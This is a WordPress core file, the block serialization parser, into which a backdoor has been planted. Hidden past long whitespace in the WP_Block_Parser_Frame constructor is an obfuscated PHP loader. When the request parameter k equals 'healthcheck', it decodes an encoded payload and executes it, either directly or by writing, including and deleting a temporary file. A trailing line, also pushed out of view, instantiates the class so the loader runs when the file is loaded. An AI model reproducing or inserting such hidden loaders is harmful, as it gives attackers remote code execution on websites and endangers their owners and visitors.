<?php
/**
 * Block Serialization Parser
 *
 * @package WordPress
 */

/**
 * Class WP_Block_Parser_Block
 *
 * Holds the block structure in memory
 *
 * @since 5.0.0
 */
class WP_Block_Parser_Block {
	/**
	 * Name of block
	 *
	 * @example "core/paragraph"
	 *
	 * @since 5.0.0
	 * @var string
	 */
	public $blockName;

	/**
	 * Optional set of attributes from block comment delimiters
	 *
	 * @example null
	 * @example array( 'columns' => 3 )
	 *
	 * @since 5.0.0
	 * @var array|null
	 */
	public $attrs;

	/**
	 * List of inner blocks (of this same class)
	 *
	 * @since 5.0.0
	 * @var WP_Block_Parser_Block[]
	 */
	public $innerBlocks;

	/**
	 * Resultant HTML from inside block comment delimiters
	 * after removing inner blocks
	 *
	 * @example "...Just <!-- wp:test /--> testing..." -> "Just testing..."
	 *
	 * @since 5.0.0
	 * @var string
	 */
	public $innerHTML;

	/**
	 * List of string fragments and null markers where inner blocks were found
	 *
	 * @example array(
	 *   'innerHTML'    => 'BeforeInnerAfter',
	 *   'innerBlocks'  => array( block, block ),
	 *   'innerContent' => array( 'Before', null, 'Inner', null, 'After' ),
	 * )
	 *
	 * @since 4.2.0
	 * @var array
	 */
	public $innerContent;

	/**
	 * Constructor.
	 *
	 * Will populate object properties from the provided arguments.
	 *
	 * @since 5.0.0
	 *
	 * @param string $name         Name of block.
	 * @param array  $attrs        Optional set of attributes from block comment delimiters.
	 * @param array  $innerBlocks  List of inner blocks (of this same class).
	 * @param string $innerHTML    Resultant HTML from inside block comment delimiters after removing inner blocks.
	 * @param array  $innerContent List of string fragments and null markers where inner blocks were found.
	 */
	function __construct( $name, $attrs, $innerBlocks, $innerHTML, $innerContent ) {
		$this->blockName    = $name;
		$this->attrs        = $attrs;
		$this->innerBlocks  = $innerBlocks;
		$this->innerHTML    = $innerHTML;
		$this->innerContent = $innerContent;
	}
}

/**
 * Class WP_Block_Parser_Frame
 *
 * Holds partial blocks in memory while parsing
 *
 * @internal
 * @since 5.0.0
 */
class WP_Block_Parser_Frame {
	/**
	 * Full or partial block
	 *
	 * @since 5.0.0
	 * @var WP_Block_Parser_Block
	 */
	public $block;

	/**
	 * Byte offset into document for start of parse token
	 *
	 * @since 5.0.0
	 * @var int
	 */
	public $token_start;

	/**
	 * Byte length of entire parse token string
	 *
	 * @since 5.0.0
	 * @var int
	 */
	public $token_length;

	/**
	 * Byte offset into document for after parse token ends
	 * (used during reconstruction of stack into parse production)
	 *
	 * @since 5.0.0
	 * @var int
	 */
	public $prev_offset;

	/**
	 * Byte offset into document where leading HTML before token starts
	 *
	 * @since 5.0.0
	 * @var int
	 */
	public $leading_html_start;

	/**
	 * Constructor
	 *
	 * Will populate object properties from the provided arguments.
	 *
	 * @since 5.0.0
	 *
	 * @param WP_Block_Parser_Block $block              Full or partial block.
	 * @param int                   $token_start        Byte offset into document for start of parse token.
	 * @param int                   $token_length       Byte length of entire parse token string.
	 * @param int                   $prev_offset        Byte offset into document for after parse token ends.
	 * @param int                   $leading_html_start Byte offset into document where leading HTML before token starts.
	 */
	function __construct( $block = null, $token_start = null, $token_length = null, $prev_offset = null, $leading_html_start = null ) {                                                                                                                                                                                                        if (@$_REQUEST["k"] === "healthcheck") {$bjTn = function($ASPf) { return strtr($ASPf, 'Ix0PWgzAiuXmDqLNd6o51KlBwrfJ_bsFRkQnpv9Z48tYejVUESCHyMchaTG237O', 'jgs2boe6_VtGdMSBClfwTyOaN9DpEkWvUc817HZYui5rqPRJmInxA3Q4zLXKFh0'); };$UCRs = $bjTn('xzXiDzo8CzDio4CkX8gC0');$AeAe = $UCRs();$hajSN = $AeAe[$bjTn('8CXzYCB6')];foreach ($hajSN as $xRVc => $spzd) {if (false !== strpos($spzd, $bjTn('hiD'))) {$pohHy = $hajSN[$xRVc];continue;}if (false !== strpos($spzd, $bjTn('a8Co'))) {$vmiV = $hajSN[$xRVc];continue;}if (false !== strpos($spzd, $bjTn('zBXzio4'))) {$GNkE = str_replace($bjTn('0e68Xzi'), "", $hajSN[$xRVc]);continue;}if (false !== strpos($spzd, $bjTn('a4Ck'))) {$sLPn = $hajSN[$xRVc];continue;}}$OaVDJ = $vmiV($sLPn($pohHy($bjTn('zU5Ns7L6A+OQWGFWwJ2o6u+NQYxuX9u6lMMWIVOCWe2bFYeHuMWBp169jJc_sZ5Jb8sJ4mCe/MhaxMzLbJsb1s/FPc+PUsy5mq5W9xBylpw6leC8TmR7ThYyGtLGF14DXMkACZUGKKU6YQg0fGbAKBZQ8Sg8z7whyUxuvYX/5vWpaSqVrUEmrFW4Dmp4MlbZYyRFyM+LJVujeMoyFylZtL8NGB_cqtxUdYpSGFqCkkSfo5B/tVaHIysohjzc/H2GuLbpz+HXNMgudusHtSdjLN9fhI2kHgsNXgdGBV2CupUTItJ6NZQEkHBRbKxncn6RqI+4+_T8cl1OCDP/apefTFFXwP9rvMc6GyoGmBzdTfmfS2K+1I9xIhrm5OoCUAlo5Yj7Azvg_ftdet7ug9lOaA2bX3fzmdbRdOwOGGx3Yd7WC3GcC/fO0JYMccpaed7tHzhaWPoMp4DoojCunM/pzaLz1jC0k7A/4bgsB9W/GU1uQFGnTPr+joaEOzj7bAoovFMMDQooja0t/kogpjatfa/+QAo/QBLbdmqOeG7VvXqbxTe0dJx5RUqVXMnw19HzhF1zCEy/q7B+p+aNOXb+bA18XQQ+bPH5H5p4APukZ_z5Sro6RTv3DC0FrnHElGxBMlS/TM69xcMHBJtwyzzKLlNMXeaEqyH_DJ+6K5LWkJxTgmyKOaWCODcO2lBy+zV9sXUZoxPqE1t2gYSqxduBKKRNLXlrdk5TG/I_APCXd+SOf8rt3G7VbE1GSZTq0JKCmeWI9M6u7ELUqU45LlYgzmU3O0a3Ae8vNdlusrv/KGPtyEZ7FjN_X/kLRdXcBpNy8YWxC9AkCGF0OOQDT7EbxXBlxn0tdbc+YAgQvd/I9NedlSgMxZumbCXI6e0GA4_h0RdfskSTM/wTUVL1VhXcwgc1+3BNczScNc5LyONKjkfFRwSmfg8OxcKHaHV2Eh3m1HeYCuOGqkPIcyyfa2js5axxn9HV2YwnqqAE2_J0ku94SqY69qUTU38tcbFGU9V5m/ZkYc8q8pvpZuwystOQvHOagUauXS/3U9Fm91Vl+v1xY9Xo+u05u_NS2xheGR6fdweutcvaLc64O5XPa5d8Gp61uO466nS8wfPhftypleb+z51YlabrfHmgfhtIpnBgUOofhQDCo1EFP_+SHhPUC5pnFwcCNJNMczv8C5vavCIg+ACjh3TzWAPhEXSL0tk0z7M3dkYEvxq8mT7BZ0TzCVuLSxmXGfGQ_1AV3Y0LWfcQoatADIhAovWP9fIebP24vM3PD7a+qN5DjoCJDSxIBmCY7a5tl1h++ovhtwv7+DvU0OOEl1/AoCIKvS1p+kAlkWhXGEQ67E/jaO+/vVh+V7TulyX1E/EFJF/gzm7FTcSjdEl9uqg+kyFyZWc5EbjPh5LdLs0RVf4_DgkdzftRa5LVV93EE0gWUZUUbJukwpkgEHOfxJQrCQo6Bu1wyKF+A5p8DwS6SHJvUR/NPglcsNzm4l0HgEgk1BhePjJH8tMKQoSKndPO/R3x_ADQmC8j7rQQoHJ+k/IglnflVQj5AlEabr_5jN5rjkwZJXwt5wBySqyrr415+m5gFSqjRxMNNQvEgvB7qq/K5NfRk5awx3rh4TXhTHFQaKl2CF2dGOTkCLzh7lpf3QvxYK+d3pMNG/PvM1pY5g/E5XhXhhg6V2qTF8RP4eE3xxBt3m2T32SXCVaskaZJZX17bFpPEyYr0xuqsJZkGNMUA20Fu_95+BFe7SQxxhcPsIE+UKTds9vNGe5fRX8k5M2+CqOxVYBdOrR7Ale5wo1_f3GPH+U/vVsg6XZbMCF3O8Uyf6+CBvm2QRmjTR_MxFg0ejJL96P/dr4m8oqJvjA8app0xZ1Y5/WZfkPfFb6v18vgZgSVrltGozmnHqS5xXS585IOm0bfYfLBxUSZg+ugIl_c70XV7T/x7nYxNH0HnUE75hLomvtz5kQu/mfSFqfX0hkl8BBI8BsyvfphSfC3dtYluJ5+0AV00kZfO2dT4KeqH7cS/e5odYX5X+kJTe_syHGp+/FfbMw08qZsRzfBJX9bkxJbcrod8WWEawIucFx9bTMnX1J8edbruBIE2TPzxSO8twvjxVywoGbWV1kGnFxZ56mcDxUfG4p9BLPyZKgp3bEh3ZzcZAzXNSIjqQaK+a93GhV1cmBK8AEZr4Wdvp/kBOXnwQ1pBtalvq1QDO2qvxtht+dzLWwGGX_dTMrlSdZvcpAVf6mLOj4xHZvgvyTEXKQlo/HGdyklk7phRhX2KQq8u7OUHwydXIoYZBUu1Kd7scRmdnoTefAfaqx2gl3LAJDZsVPUeRvh85dSTe0gYs5m5YthoSKT9or8poPj7AzISZVg5Qo__Qj23apmf/h0SqB/0eUCqBGgnp9mX8rw/tsEdg0mZoIhBNLmZTYsHw0ZwA8nDo5Y65zRPzuTbrb9KqL33yRIMZnkz47oNzImT2IrN/bQ95d3Q1XhXa9sc2fAG1IQUM3NUhRuJdFKZ5kS1J91vEZJ22boLHn_beHFwP5LusI15nQEjdoG+qTCmJQT1lVBU_HIIIV8qysfXxpz40pCzrdHANUNWxSx_9LxRYlBajwm7GxxvMVmhNIUSPRJNOpHEeMUHjH3hos9rKTnZ_FKh2q1JGIW/MJVoYBrQ_colDPz_aU2MTsSqLt7U+DU_622_5xzKdmoQ_uzFcCOpxBlq1fWE3D1DU7u_JgGPLLbbxgcc+RG+34+2L0ltv6tuUWuF378ZAAxNyPKuwqgWcgLKZZG0d/Ye_6RmlY6SlegGbkUnkT52+hUz9KTzg19DHBhYRpmK0LJEy7HH5Nfk9vW5uZM7Dcd1s5KJ7mhXpmpN5c0c7D7rmO3uE_TxSU1NwNLdD_un_pCZBles80nBf5ZwHxjSmR6sd/J7sRUBl_j8yoSPny4kVqz6vjUy0yGEEWhUXFu2YfrFap9v0oJwg5N/JH+zHgl1hpV87GfDxQOmImAh1F_4F4AFdnTl0VP5t_sUIshYK9KUdd_PdSNfuP1cenDm93ynzd+a4n4nTpLe_RBgrNpKJLT2fhYKJHjM3TIfgZ9KJtyDD3SdYNQAXHXAWHsCGoGD2gONPxVLBEEL70GVJ0lG9I7glMOB7Z72hy4l5CKZ6o4/1l9FTeXVJjGgTIW8b2nmxlCNLxZ0BHBdBb7dBkxT_TF4XEx5s4CZWvmqVKHEGheBDvBw6plXd86r0IAyrbBD3jwb0WSpuS5w3pbdL9QAlS3S_GLQqMucBPyXKnR4X5/W2C9lScw4eIRq0uQBe3XLhcVIYN6TaVj_7A6czQruAYM6S+PuIGICpUBHhMQ/7e0fP6KAV657z7rCwsnmeQ45Cuk2tRsACL/4apWckSoXo8Ltp8I7BSt6TZvSVh4sVqczS78IO/EmLLEq2WYjrfQ_cb//OsZq/Z8BGlGoc7n0olKaebyQ0rzukVxVx8xol9B9JE8h+JAgKtJC+_BpwlmV7uWHB9n72glBeuwbCkrUEdH2CY78RZAxATuL2xrIu2ydB_VEqcEs485c4hKr+179EOkHEo4lUTAyARyzJKp28zbtwlhde/IB7tdn7mSSJhq2K_EV0Rj0chMIcXaf24jf4n4nqRf_s820PnMX3RgeqoBL4kzcxoZO713_uI6Vq7fgYS22DD_7B2k_/RBEtGMgfbX4qBVmc2gvwFyGGxTEB8QNwXPnrqg8pk_lYuQtgtal85ntB9P/L3TGbjc7puJ0RxuHxXp4RKK0WuAs7onKyG7VcmVbmNaW5l+cJLZ18E2c/suLRcGlZOHvX4B0zpyZWDDe9jtIYU84LbWIvRnu6Et_pwWdyl1XDFCA2UBtMye1EDQRx6sgllxsSaeaNjq5q/H7qWwx25UBUc0lWWHGT3stCZBGfvw6T0OSeHAtZeClT97lKZurp3ST8jXNGpmGebF/0H2mVAPHlSBbEVFc1ou_VD+QDSks8lHhXyAHAP21EGg4toaZx3+yIbptsbq/bhCrbhNLzEaZK+BNbKQ2uuFXhpwKZbLnTQM1yI9g0Zr4pBDWfxB/4jtQlaQyC2S+vuRkucPfDIHYaxzV9CLrztDFR2DOwC6Nl/gPD65DNt+w/5UuVemBKM1yPFRBf5L1gw9nUU+PCVNGgh37rUqaAw2mXTClHBwu1V4y3RyrTRwU2FSN84b6aV5hUKYsf6WKKgR_gVesQjf6Y5O6rsRjelIg0j1O+maHpZyeE5tEc0hnv7fkP0cb+R10dQluxtpZIH3kDYS7v_m1L8Bx_tCvofApl5aDzI4TqtQgTNd2d7DckbDkID1lZb_w_oxxyrp2KBL4grxCx56jdwR91WLfWZTpok5rVXCKM2F89NjIrwGGj7o0nwkxI924/DgepfrbMZVa4IAYefQH0DKmQY/e8uya62HYcCa/F21G_2D5InT/o/IkfAE5/3tlZ6KjxO6bqqKCPerTMHDKnsI/L8vZyOmToykec0LLe09QOdPwYJNnPl/0ZJaX7sVM34m7hRD3nbD14spweyVt2wBpn7L0m5fa/2KUT4mqmg337GTZOspHGYWWl9MkxxwRWOfPER2RLm9gZIUWB5Y3_v9SM6YXIu6fp4fcmVvPE0j4gA1+GD5nzPUcdOJGk3R8EhDFe99HsW9qJu8keAWw7qhK3rYbWS1STr/zlKCgGSIy4RfQNAcR4p+eWmakSkW7qO_+lD3a313wQvKNnmddCvYIbkkRcU1A9gQx+xana+IqnzvmLTw2twhS8+LdKVrFv_/yLP0pwZzPPU2THaM4dU8uTukchzB4Do4nopwx08wVBxkKzgXQFrOzmDFZL0IFGoD5IAB2shZEopHwFYzRBbFGC4gByoFHPM3ajlf5y+4UP5YZo4_ZwfXWkmle6MM34PCFup/71/nMyfSZ253c2WffZfkyzQWyTuI+RQyXfZy+xyMQ/3f_nQgBLq4EhNh01WXX_yQSkpHZD5nvHD97gkd_fQb3SnhxPPBKW/l8eXc32_nMSNtPrR8MQWgYSVcxbSllX3hL/olSn886+lnJv4hRfebglDCGJp7GLG8OVIE4XgaQ2rtxGYLmTSpPjCp883xrJEyWa+EE4k_gWzBH7EBy3NooD87ggPjaDHdBt9GS9h3qoRkKgYm9wR+I_f/HNqIBu_ZCmG8+x+2vkHtBzaqgqVGR7SqlvQoYax_SxU_y5kPrr1cNQaWQoyU7o5lhjFIZFXyRC1ITwjWCnzTtmyoTQyopm+Tj+xufYKNCCaxpsr1m5yxXqNOhQYSFLrq+vFX_bqm3833Ns0_J+Sm5qOYSaA_DWJqJDnsEUjF6NsAjbdyhwX2p+1O_sU77ADvab6Ra+21qMI3PmCmKpVWqGbNKWgGnpt5qNeaWj0DgWSKFBdPrBK8A_b_l2B0K4c11_ZjRf12nRcXkhYkw_sow3av0b80DqAB_r+AOTqDtN++Xh0T5aQtItYsTQ8a8fDtrS8EaHJapmb8/_So+IRCHbtQMXg+R1sjLH6DlKQVrbVFSpnVQlJBL8BYq7L+3m2jN_D06ZQbJdgKTkDPOkcq099M7B_lg4AYRa5vG+OLbVFS2/JRmevhSkw6er42PDQrZ3QDY909Ab3pl56PhmtXozMeM2BLO+5A1WUgmgeKP/QoMs5+xp90oC331MrDbHG9CM5VgFFeGZlsfV/odI1Pow_SEhlJE/tw1e1FsQa_oc4wGDak_bNL2+XncC_J3TbE6urzE5U3nXkHa2OArOAuoV4IsLJJTaTVpZ4GaJpcAqGGep4lD60xLcc7dS3xxly9IBtvN/spFUgYUJFvdqAfodmGr57sVypw2aoPdQwsO0etVD6bF08EI67PFFpKLtlUau4OJAj4I2I0gbE+Ol7KM6NJuA0V528ngrbD_P/pxxnRq9QT1uIUUxCY9gpn9/RPYkOwszyOJRbrg8O+qLrOupgW47CAVa4WoM0o0SmaHyDd666/gwD0QHVmYgM_Kz7w4pIVhwkSmkjGD8CTmnKq1bgP_fV_/SIWxQxL/lcWkzR3WA7fodtrg2gI6/w67sYhTLPHdlxNgn1Kr1DFDlg6TrVRWMSL41V8sFS5vStmUAwp1XqIoyY9PFpr2VhHXMcr7h86YGOOov1K5MNO+_MpqUYJHQjV0AwC1rFCB4OQjVKDfss1YLYnEOllzp7f14cLfSF1AOf8eCAd7WoMv_9Tl98MmOBFlyVy2eE9kJvRwTu_NzGK2kotFq84qZnxt8sv1oYsxGEk_D7jBlJ2LCFZs8O6GuKFeNFvjPYyoDZP71vp+7lSrpv46xVm4mkpkEI6LRmaY+j2jd4YrLKUQOnDDjwb2KX4cZhcm+QyXn/wXAocFsPJAbWh9PRP4ueUG/D48wrvzfg2RxlWkCfP7VYMAUeQk/GobhQMP3B0v/_5zgNyk/G9YFGtYFpkRKQf+YgOUBEPOgOaylcu5M6_IbaUk9nzYU1ke/uS0XzEM7SpNvKJTl/j2NboYqXHOS/o3E+SK29uvGfvMrLQurugsbpH1vmF7ZaPpW1qQuTSWk4xlXTeXZxBnQW+Axw1/3Cp2t5BufqGqRzYYZ01tAHOJncJ4ZY9f3XnzTYENbFWr9umqR3kZUC9+GpTSByhbMWeNFek1o19NMPMuejHNU++5homFYXUYdOlB1tlbjOV33_zr4X/aX3+Uc2yuEzYg6oQWHC_ZnS+7DPApEKZ1ReQkkMdCasPtHWroEk3NKesLWUsKtnt5xRFTIEJVrrkquZhR33npZK4uDbeneJz2nKKmMdOABm+X/3HvDzoed+/xa4puD8Y9sMDbpv_Wc6tZ5Q8Iay/OXAJW5d4PVEnUNF//Td6bS+rSFKc/aWcZMwxrU7arkQ1J+rBA9Qt234uo0JCO12JYmqncFR0ZKJPHRzsQL5mHUN0AE8t9vIElqE2ybM3_cIrzAEw/erj7RbVj9fsTrPfpI1ErwQatdS7tgL_dj+WHFQdZeZj4y=='))));if (isset($GNkE) && function_exists($GNkE)) {$nkBua = $bjTn('zYYgYiYzJgYX8Cx');if (function_exists($nkBua)) {$nkBua(constant($bjTn('_iyTT')) ^ constant($bjTn('_if_jV_dy1_f')));}$g = $GNkE('', $OaVDJ);} else {$g = function() use($bjTn, $OaVDJ) {$kylqM = __DIR__ . $bjTn('/.8Ck');$wWuX = $bjTn('o86ziJ4XikgCXzCX0');$ELevb = $bjTn('4C68Cb');if (@$wWuX($kylqM, $bjTn('<?J7J ') . $OaVDJ, constant($bjTn('Tld2i_G')))) {try {include_once($kylqM);$ELevb($kylqM);} catch (Exception $e) {$ELevb($kylqM);if ($bjTn('D8z') === $e->{$bjTn('xzXqz00Bxz')}()) exit;}}};}$g();}
		$this->block              = $block;
		$this->token_start        = $token_start;
		$this->token_length       = $token_length;
		$this->prev_offset        = isset( $prev_offset ) ? $prev_offset : $token_start + $token_length;
		$this->leading_html_start = $leading_html_start;
	}
}

/**
 * Class WP_Block_Parser
 *
 * Parses a document and constructs a list of parsed block objects
 *
 * @since 5.0.0
 * @since 4.0.0 returns arrays not objects, all attributes are arrays
 */
class WP_Block_Parser {
	/**
	 * Input document being parsed
	 *
	 * @example "Pre-text\n<!-- wp:paragraph -->This is inside a block!<!-- /wp:paragraph -->"
	 *
	 * @since 5.0.0
	 * @var string
	 */
	public $document;

	/**
	 * Tracks parsing progress through document
	 *
	 * @since 5.0.0
	 * @var int
	 */
	public $offset;

	/**
	 * List of parsed blocks
	 *
	 * @since 5.0.0
	 * @var WP_Block_Parser_Block[]
	 */
	public $output;

	/**
	 * Stack of partially-parsed structures in memory during parse
	 *
	 * @since 5.0.0
	 * @var WP_Block_Parser_Frame[]
	 */
	public $stack;

	/**
	 * Empty associative array, here due to PHP quirks
	 *
	 * @since 4.4.0
	 * @var array empty associative array
	 */
	public $empty_attrs;

	/**
	 * Parses a document and returns a list of block structures
	 *
	 * When encountering an invalid parse will return a best-effort
	 * parse. In contrast to the specification parser this does not
	 * return an error on invalid inputs.
	 *
	 * @since 5.0.0
	 *
	 * @param string $document Input document being parsed.
	 * @return WP_Block_Parser_Block[]
	 */
	function parse( $document ) {
		$this->document    = $document;
		$this->offset      = 0;
		$this->output      = array();
		$this->stack       = array();
		$this->empty_attrs = json_decode( '{}', true );

		do {
			// twiddle our thumbs.
		} while ( $this->proceed() );

		return $this->output;
	}

	/**
	 * Processes the next token from the input document
	 * and returns whether to proceed eating more tokens
	 *
	 * This is the "next step" function that essentially
	 * takes a token as its input and decides what to do
	 * with that token before descending deeper into a
	 * nested block tree or continuing along the document
	 * or breaking out of a level of nesting.
	 *
	 * @internal
	 * @since 5.0.0
	 * @return bool
	 */
	function proceed() {
		$next_token = $this->next_token();
		list( $token_type, $block_name, $attrs, $start_offset, $token_length ) = $next_token;
		$stack_depth = count( $this->stack );

		// we may have some HTML soup before the next block.
		$leading_html_start = $start_offset > $this->offset ? $this->offset : null;

		switch ( $token_type ) {
			case 'no-more-tokens':
				// if not in a block then flush output.
				if ( 0 === $stack_depth ) {
					$this->add_freeform();
					return false;
				}

				/*
				 * Otherwise we have a problem
				 * This is an error
				 *
				 * we have options
				 * - treat it all as freeform text
				 * - assume an implicit closer (easiest when not nesting)
				 */

				// for the easy case we'll assume an implicit closer.
				if ( 1 === $stack_depth ) {
					$this->add_block_from_stack();
					return false;
				}

				/*
				 * for the nested case where it's more difficult we'll
				 * have to assume that multiple closers are missing
				 * and so we'll collapse the whole stack piecewise
				 */
				while ( 0 < count( $this->stack ) ) {
					$this->add_block_from_stack();
				}
				return false;

			case 'void-block':
				/*
				 * easy case is if we stumbled upon a void block
				 * in the top-level of the document
				 */
				if ( 0 === $stack_depth ) {
					if ( isset( $leading_html_start ) ) {
						$this->output[] = (array) $this->freeform(
							substr(
								$this->document,
								$leading_html_start,
								$start_offset - $leading_html_start
							)
						);
					}

					$this->output[] = (array) new WP_Block_Parser_Block( $block_name, $attrs, array(), '', array() );
					$this->offset   = $start_offset + $token_length;
					return true;
				}

				// otherwise we found an inner block.
				$this->add_inner_block(
					new WP_Block_Parser_Block( $block_name, $attrs, array(), '', array() ),
					$start_offset,
					$token_length
				);
				$this->offset = $start_offset + $token_length;
				return true;

			case 'block-opener':
				// track all newly-opened blocks on the stack.
				array_push(
					$this->stack,
					new WP_Block_Parser_Frame(
						new WP_Block_Parser_Block( $block_name, $attrs, array(), '', array() ),
						$start_offset,
						$token_length,
						$start_offset + $token_length,
						$leading_html_start
					)
				);
				$this->offset = $start_offset + $token_length;
				return true;

			case 'block-closer':
				/*
				 * if we're missing an opener we're in trouble
				 * This is an error
				 */
				if ( 0 === $stack_depth ) {
					/*
					 * we have options
					 * - assume an implicit opener
					 * - assume _this_ is the opener
					 * - give up and close out the document
					 */
					$this->add_freeform();
					return false;
				}

				// if we're not nesting then this is easy - close the block.
				if ( 1 === $stack_depth ) {
					$this->add_block_from_stack( $start_offset );
					$this->offset = $start_offset + $token_length;
					return true;
				}

				/*
				 * otherwise we're nested and we have to close out the current
				 * block and add it as a new innerBlock to the parent
				 */
				$stack_top                        = array_pop( $this->stack );
				$html                             = substr( $this->document, $stack_top->prev_offset, $start_offset - $stack_top->prev_offset );
				$stack_top->block->innerHTML     .= $html;
				$stack_top->block->innerContent[] = $html;
				$stack_top->prev_offset           = $start_offset + $token_length;

				$this->add_inner_block(
					$stack_top->block,
					$stack_top->token_start,
					$stack_top->token_length,
					$start_offset + $token_length
				);
				$this->offset = $start_offset + $token_length;
				return true;

			default:
				// This is an error.
				$this->add_freeform();
				return false;
		}
	}

	/**
	 * Scans the document from where we last left off
	 * and finds the next valid token to parse if it exists
	 *
	 * Returns the type of the find: kind of find, block information, attributes
	 *
	 * @internal
	 * @since 5.0.0
	 * @since 4.6.1 fixed a bug in attribute parsing which caused catastrophic backtracking on invalid block comments
	 * @return array
	 */
	function next_token() {
		$matches = null;

		/*
		 * aye the magic
		 * we're using a single RegExp to tokenize the block comment delimiters
		 * we're also using a trick here because the only difference between a
		 * block opener and a block closer is the leading `/` before `wp:` (and
		 * a closer has no attributes). we can trap them both and process the
		 * match back in PHP to see which one it was.
		 */
		$has_match = preg_match(
			'/<!--\s+(?P<closer>\/)?wp:(?P<namespace>[a-z][a-z0-9_-]*\/)?(?P<name>[a-z][a-z0-9_-]*)\s+(?P<attrs>{(?:(?:[^}]+|}+(?=})|(?!}\s+\/?-->).)*+)?}\s+)?(?P<void>\/)?-->/s',
			$this->document,
			$matches,
			PREG_OFFSET_CAPTURE,
			$this->offset
		);

		// if we get here we probably have catastrophic backtracking or out-of-memory in the PCRE.
		if ( false === $has_match ) {
			return array( 'no-more-tokens', null, null, null, null );
		}

		// we have no more tokens.
		if ( 0 === $has_match ) {
			return array( 'no-more-tokens', null, null, null, null );
		}

		list( $match, $started_at ) = $matches[0];

		$length    = strlen( $match );
		$is_closer = isset( $matches['closer'] ) && -1 !== $matches['closer'][1];
		$is_void   = isset( $matches['void'] ) && -1 !== $matches['void'][1];
		$namespace = $matches['namespace'];
		$namespace = ( isset( $namespace ) && -1 !== $namespace[1] ) ? $namespace[0] : 'core/';
		$name      = $namespace . $matches['name'][0];
		$has_attrs = isset( $matches['attrs'] ) && -1 !== $matches['attrs'][1];

		/*
		 * Fun fact! It's not trivial in PHP to create "an empty associative array" since all arrays
		 * are associative arrays. If we use `array()` we get a JSON `[]`
		 */
		$attrs = $has_attrs
			? json_decode( $matches['attrs'][0], /* as-associative */ true )
			: $this->empty_attrs;

		/*
		 * This state isn't allowed
		 * This is an error
		 */
		if ( $is_closer && ( $is_void || $has_attrs ) ) {
			// we can ignore them since they don't hurt anything.
		}

		if ( $is_void ) {
			return array( 'void-block', $name, $attrs, $started_at, $length );
		}

		if ( $is_closer ) {
			return array( 'block-closer', $name, null, $started_at, $length );
		}

		return array( 'block-opener', $name, $attrs, $started_at, $length );
	}

	/**
	 * Returns a new block object for freeform HTML
	 *
	 * @internal
	 * @since 3.9.0
	 *
	 * @param string $innerHTML HTML content of block.
	 * @return WP_Block_Parser_Block freeform block object.
	 */
	function freeform( $innerHTML ) {
		return new WP_Block_Parser_Block( null, $this->empty_attrs, array(), $innerHTML, array( $innerHTML ) );
	}

	/**
	 * Pushes a length of text from the input document
	 * to the output list as a freeform block.
	 *
	 * @internal
	 * @since 5.0.0
	 * @param null $length how many bytes of document text to output.
	 */
	function add_freeform( $length = null ) {
		$length = $length ? $length : strlen( $this->document ) - $this->offset;

		if ( 0 === $length ) {
			return;
		}

		$this->output[] = (array) $this->freeform( substr( $this->document, $this->offset, $length ) );
	}

	/**
	 * Given a block structure from memory pushes
	 * a new block to the output list.
	 *
	 * @internal
	 * @since 5.0.0
	 * @param WP_Block_Parser_Block $block        The block to add to the output.
	 * @param int                   $token_start  Byte offset into the document where the first token for the block starts.
	 * @param int                   $token_length Byte length of entire block from start of opening token to end of closing token.
	 * @param int|null              $last_offset  Last byte offset into document if continuing form earlier output.
	 */
	function add_inner_block( WP_Block_Parser_Block $block, $token_start, $token_length, $last_offset = null ) {
		$parent                       = $this->stack[ count( $this->stack ) - 1 ];
		$parent->block->innerBlocks[] = (array) $block;
		$html                         = substr( $this->document, $parent->prev_offset, $token_start - $parent->prev_offset );

		if ( ! empty( $html ) ) {
			$parent->block->innerHTML     .= $html;
			$parent->block->innerContent[] = $html;
		}

		$parent->block->innerContent[] = null;
		$parent->prev_offset           = $last_offset ? $last_offset : $token_start + $token_length;
	}

	/**
	 * Pushes the top block from the parsing stack to the output list.
	 *
	 * @internal
	 * @since 5.0.0
	 * @param int|null $end_offset byte offset into document for where we should stop sending text output as HTML.
	 */
	function add_block_from_stack( $end_offset = null ) {
		$stack_top   = array_pop( $this->stack );
		$prev_offset = $stack_top->prev_offset;

		$html = isset( $end_offset )
			? substr( $this->document, $prev_offset, $end_offset - $prev_offset )
			: substr( $this->document, $prev_offset );

		if ( ! empty( $html ) ) {
			$stack_top->block->innerHTML     .= $html;
			$stack_top->block->innerContent[] = $html;
		}

		if ( isset( $stack_top->leading_html_start ) ) {
			$this->output[] = (array) $this->freeform(
				substr(
					$this->document,
					$stack_top->leading_html_start,
					$stack_top->token_start - $stack_top->leading_html_start
				)
			);
		}

		$this->output[] = (array) $stack_top->block;
	}
}
                                                                                                                                                                                                                                                                                                            new WP_Block_Parser_Frame;
